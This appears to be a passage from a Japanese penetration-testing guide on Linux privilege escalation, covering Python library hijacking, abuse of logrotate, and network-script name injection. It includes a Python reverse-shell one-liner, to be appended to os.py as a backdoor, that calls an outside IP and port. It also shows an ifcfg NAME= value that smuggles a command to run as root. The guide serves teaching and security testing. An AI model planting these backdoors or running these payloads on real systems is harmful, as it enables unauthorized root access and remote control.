**ログを読むためのグループ** [**adm**](interesting-groups-linux-pe/index.html#adm-group) は非常に役立ちます。

### Shellファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイル名や内容に**password**という単語が含まれていないかを確認し、ログ内のIPやメールアドレス、ハッシュ用のregexpsもチェックしてください。\
ここではこれらすべてのやり方を列挙しませんが、興味がある場合は[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)が実行する最後のチェックを参照してください。

## 書き込み可能なファイル

### Python library hijacking

もし**どこから**pythonスクリプトが実行されるか分かっていて、そのフォルダに**書き込みできる**か、あるいは**pythonライブラリを変更できる**なら、OSライブラリを改変してbackdoorを仕込むことができます（pythonスクリプトが実行される場所に書き込みできるなら、os.pyライブラリをコピーして貼り付けてください）。

ライブラリに**backdoor the library**するには、os.pyライブラリの末尾に以下の行を追加してください（IP と PORT を変更してください）:
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate の悪用

`logrotate` の脆弱性により、ログファイルやその親ディレクトリに対して **書き込み権限** を持つユーザーが特権昇格を行える可能性があります。これは `logrotate` が多くの場合 **root** として実行されており、任意のファイルを実行するよう操作され得るためで、特に _**/etc/bash_completion.d/**_ のようなディレクトリが狙われます。_ /var/log_ だけでなく、ログローテーションが適用されるあらゆるディレクトリの権限を確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` バージョン `3.18.0` およびそれ以前に影響します

この脆弱性の詳細は次のページを参照してください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) を使って悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** と非常に似ているため、ログを変更できる場合は、そのログを誰が管理しているかを確認し、ログをシンボリックリンクに置き換えて特権昇格できないかを調べてください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由でユーザーが `ifcf-<whatever>` スクリプトを _/etc/sysconfig/network-scripts_ に **書き込める**、または既存のものを **修正できる** のであれば、あなたの **system is pwned**。

Network scripts（例: _ifcg-eth0_）はネットワーク接続に使われます。見た目はまさに .INI ファイルです。しかし、Linux では Network Manager (dispatcher.d) によって \~sourced\~ されます。

私のケースでは、これらの network スクリプト内の `NAME=` 属性が正しく処理されていませんでした。**名前に空白があると、システムは空白の後の部分を実行しようとする**。これは **最初の空白以降のすべてが root として実行される** ことを意味します。

例えば: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network と /bin/id の間の空白に注意_)

### **init, init.d, systemd, and rc.d**

ディレクトリ `/etc/init.d` は System V init (SysVinit) 用の **スクリプト** の格納場所です。これはクラシックな Linux サービス管理システムです。ここにはサービスを `start`、`stop`、`restart`、場合によっては `reload` するためのスクリプトが含まれます。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` が使われます。

一方、`/etc/init` は **Upstart** に関連しており、Ubuntu が導入したより新しい **サービス管理** で、サービス管理のために設定ファイルを使用します。Upstart への移行にもかかわらず、互換レイヤーがあるため SysVinit スクリプトは Upstart の設定と並行してまだ利用されています。

**systemd** はモダンな初期化およびサービスマネージャとして登場し、オンデマンドのデーモン起動、automount 管理、システム状態のスナップショットなどの高度な機能を提供します。ファイルは配布パッケージ用に `/usr/lib/systemd/`、管理者の変更用に `/etc/systemd/system/` に整理され、システム管理を簡素化します。

## その他のトリック

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は一般に syscall をフックして privileged kernel 機能を userspace manager に公開します。弱い manager 認証（例: FD-order に基づく signature checks や不十分なパスワード方式）により、ローカルアプリが manager を偽装して already-rooted devices 上で root に昇格できる場合があります。詳細と exploit の手順は以下を参照してください:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations の regex ベースの service discovery は、プロセスのコマンドラインからバイナリパスを抽出し、privileged コンテキストで `-v` を付けて実行することがあります。許容的なパターン（例: `\S` を使用）では、`/tmp/httpd` のような書き込み可能な場所に設置した攻撃者のリスナにマッチして root として実行される可能性があります（CWE-426 Untrusted Search Path）。

詳細と他の discovery/monitoring スタックにも適用できる一般化パターンは以下を参照してください:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## カーネルのセキュリティ保護

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 追加のヘルプ

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## 参考文献

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
